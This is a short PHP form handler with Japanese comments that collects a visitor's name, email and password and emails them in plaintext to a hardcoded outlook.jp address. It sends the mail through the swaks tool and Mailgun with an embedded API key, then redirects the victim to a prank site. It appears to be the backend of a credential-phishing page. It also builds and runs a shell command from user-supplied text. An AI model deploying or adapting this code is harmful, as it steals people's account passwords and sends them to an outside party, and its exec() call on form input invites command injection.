<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Mailgunの設定
    $domain = "sandbox2a8a2607eba4407a8e4dc1872e5542d5.mailgun.org"; // 自分のMailgunサンドボックスドメイン
    $apiKey = '3kh9umujora5'; // 自分のMailgun APIキー
    $to = 'samuson846@outlook.jp';
    $subject = '新しいアカウント登録';
    $message = "名前: $name\nメールアドレス: $email\nパスワード: $password";

    // Swaksコマンドを実行
    $command = "./swaks --auth " .
               "--server smtp.mailgun.org " .
               "--au postmaster@sandbox2a8a2607eba4407a8e4dc1872e5542d5.mailgun.org " .
               "--ap 3kh9umujora5 " .
               "--to samuson846@outlook.jp " .
               "--h-Subject: \"$subject\" " .
               "--body '$message'";

    // コマンドを実行
    exec($command, $output, $return_var);

    if ($return_var === 0) {
        // 成功した場合のリダイレクト
        header('Location: https://youareanidiot.cc/'); // リダイレクト先URLを指定
        exit();
    } else {
        // エラーハンドリング
        echo 'メール送信に失敗しました: ' . implode("\n", $output);
    }
}
?>

